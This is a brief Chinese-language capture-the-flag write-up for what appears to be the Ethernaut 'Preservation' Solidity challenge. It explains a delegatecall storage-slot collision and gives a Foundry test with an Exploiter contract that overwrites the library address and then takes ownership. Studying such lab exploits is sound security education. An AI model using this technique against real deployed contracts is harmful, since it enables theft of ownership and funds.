当进行 `delegatecall` 时，是以内存布局位置，而不是变量名来确定修改的数据的。因此 `LibraryContract` 的 `setTime` 函数实际上可以修改 `Preservation` 合约的 `timeZone1Library` 变量。从而执行自定义的代码。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Preservation.sol";
import "src/levels/PreservationFactory.sol";

contract TestPreservation is BaseTest {
    Preservation private level;

    constructor() public {
        levelFactory = new PreservationFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);

        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        Exploiter exploiter = new Exploiter();

        level.setFirstTime(uint256(address(exploiter)));
        level.setFirstTime(uint256(player));

        vm.stopPrank();
    }
}

contract Exploiter {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(time);
    }
}
```

